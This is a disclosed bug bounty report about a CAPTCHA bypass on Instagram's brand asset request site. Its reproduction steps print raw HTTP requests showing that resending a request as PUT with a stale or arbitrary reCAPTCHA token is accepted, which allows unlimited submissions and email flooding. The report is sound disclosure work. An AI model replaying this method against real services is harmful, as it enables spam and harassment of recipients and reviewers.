# Captcha bypass for the most important function - At en.instagram-brand.com

## Report Details
- **Report ID**: 206653
- **URL**: https://hackerone.com/reports/206653
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-02-15T15:22:17.840Z
- **Disclosed**: 2019-06-22T14:13:02.661Z

## Reporter
- **Username**: saurabhb
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
**Product / URL**

https://en.instagram-brand.com/wp-json/brc/v1/approval-requests

**Description and Impact**

The Instagram Brand Site has a functionality for business users to request for using Instagram Assets.
The URL for creating a new request is: https://en.instagram-brand.com/requests/new
There is a CAPTCHA implementation on the last page to make sure that only legitimate users ask for this.
But, there is a way to bypass this CAPTCHA implementation.

**Impact:**
The whole purpose of having the security feature of captcha has gone in vain. A malicious user can request for infinite times. The email is also sent to that user infinite times. This will create an overhead on those who reviews these request. Also if the malicious user spoofs the email, the actual holder of that email will be flooded with mails from Instagram site.

Note: I did not sent this request to the intruder, otherwise the admin's dashboard would be flooded. But I am sure there is absolutely no rate limitation cause the captcha is broken.

**Solution:**
There is a logical flaw in captcha implementation. Make sure that every request is checked for correct captcha and is then processed.


**Reproduction Instructions / Proof of Concept**

1. Create a new request by entering right captcha value.
2. Intercept the request in a proxy tool.
3. The request will look like this:

`POST /wp-json/brc/v1/approval-requests HTTP/1.1
Host: en.instagram-brand.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-WP-Nonce: 6e74d4f6be
Content-Type: application/x-www-form-urlencoded
Referer: https://en.instagram-brand.com/requests/new/3
Content-Length: 692
Cookie: <the cookies here>
Connection: keep-alive`

`campaign-name=fdsfs&description=sdfsfsfsdfs&client=fasdfsdf&from-date=2017%2F01%2F31&to-date=2017%2F02%2F15&audience-reach=1%20-%2010%2C000&media-value=%2425%2C000%20-%20%24100%2C000&assets=11532%2C11534%2C11536&sizes=34&files=1486898411715-myjs.html&g-recaptcha-response=03AHJ_VuvtbNaOXuvMLpGNZ1r1sE8LRcGksdd_reTh3zIyz6vXE58GA_DMZfjMMLlm0gyc7qr4t5wV9YOE-CRw94WhnJn9DlIJmm2Ine1dRpiQt1x5D2-8DPgOHYxqzgYjp1bRHw2JdDDZlbfDklE0ikQlfnX6yvmX0XvQRAvUwVdoH_UZtVIrq9JolD_IfTRD9_nF2IQ7ibDU1B9dojCVuB9HQGQLmnSgQsHAP2NWg_PWJ6RsrgVEgbcke2qyNYpGTRVuU3WjyGDc53v7YwvGe2WhLU_jHFGDl-TSGD2rIZEJOJ4e6XozIKL0DGSilxXxAxG0saERnEEoKGO-05Fs9maB47ZxhhdoNnzMLNrRt8bK6rRYDO9UnxJ_2M-i9J0M34x9KI44cjm9E0aTM00VYuniBaKFkezqHg`


4. Now change the method from POST to PUT and right submit the request.
5. The request will look like:

`PUT /wp-json/brc/v1/approval-requests HTTP/1.1
Host: en.instagram-brand.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-WP-Nonce: 6e74d4f6be
Content-Type: application/x-www-form-urlencoded
Referer: https://en.instagram-brand.com/requests/new/3
Content-Length: 692
Cookie: <the cookies here>
Connection: keep-alive`

`campaign-name=fdsfs&description=sdfsfsfsdfs&client=fasdfsdf&from-date=2017%2F01%2F31&to-date=2017%2F02%2F15&audience-reach=1%20-%2010%2C000&media-value=%2425%2C000%20-%20%24100%2C000&assets=11532%2C11534%2C11536&sizes=34&files=1486898411715-myjs.html&g-recaptcha-response=03AHJ_VuvtbNaOXuvMLpGNZ1r1sE8LRcGksdd_reTh3zIyz6vXE58GA_DMZfjMMLlm0gyc7qr4t5wV9YOE-CRw94WhnJn9DlIJmm2Ine1dRpiQt1x5D2-8DPgOHYxqzgY&`

5. Repeat the request for any number of times and observe that every time instead of checking for a new captcha value, the old value or ANY VALUE from captcha is accepted.
6. Please see the attached screenshots for exact requests and response and my dashboard as a real proof of concept.

## Attachments
- InstagramBrandCAPTCHABypassDashboard.png
- InstagramBrandCAPTCHABypass.png
